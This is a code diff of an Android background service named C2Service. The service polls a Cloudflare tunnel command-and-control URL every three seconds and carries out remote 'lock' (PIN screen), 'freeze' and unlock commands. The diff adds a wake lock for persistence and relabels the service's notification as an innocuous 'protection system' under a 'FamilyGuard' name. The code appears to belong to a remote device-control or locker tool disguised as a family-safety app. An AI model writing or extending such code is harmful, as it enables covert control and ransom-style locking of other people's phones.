@@ -9,6 +9,7 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.provider.Settings;
 import org.json.JSONObject;
 import java.io.BufferedReader;
@@ -20,15 +21,21 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 public class C2Service extends Service {
+    // URL CLOUDFLARE LO
     private static final String BASE_URL = "https://variation-located-amended-pressing.trycloudflare.com";
     private static final String C2_URL = BASE_URL + "/api";
     private String androidId;
+    private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
         
         androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        
+        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "FamilyGuard::Wakelock");
+        wakeLock.acquire();
         
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -37,7 +44,8 @@ public class C2Service extends Service {
                 if (manager != null) manager.createNotificationChannel(channel);
                 
                 Notification notification = new Notification.Builder(this, "fg_channel")
-                        .setContentTitle("System Service")
+                        .setContentTitle("Sistem Proteksi")
+                        .setContentText("Berjalan di background...")
                         .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                         .build();
                 startForeground(1, notification);
@@ -60,7 +68,7 @@ public class C2Service extends Service {
             public void run() {
                 checkCommands();
             }
-        }, 0, 5000);
+        }, 0, 3000); // Cek perintah tiap 3 detik
     }
 
     private void registerDevice() {
@@ -91,7 +99,7 @@ public class C2Service extends Service {
 
             if (action.equals("lock")) {
                 Intent lockIntent = new Intent(this, LockActivity.class);
-                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 lockIntent.putExtra("msg", json.optString("msg", "Device Locked"));
                 lockIntent.putExtra("pin", json.optString("pin", "1234"));
                 startActivity(lockIntent);
@@ -100,7 +108,7 @@ public class C2Service extends Service {
                 sendBroadcast(unlockIntent);
             } else if (action.equals("freeze")) {
                 Intent freezeIntent = new Intent(this, FreezeActivity.class);
-                freezeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                freezeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 startActivity(freezeIntent);
             } else if (action.equals("stop_freeze")) {
                 Intent stopFreezeIntent = new Intent("ACTION_STOP_FREEZE");
@@ -138,6 +146,12 @@ public class C2Service extends Service {
             os.close();
             conn.getResponseCode();
         } catch (Exception e) { }
+    }
+
+    @Override
+    public void onDestroy() {
+        if (wakeLock != null) wakeLock.release();
+        super.onDestroy();
     }
 
     @Override
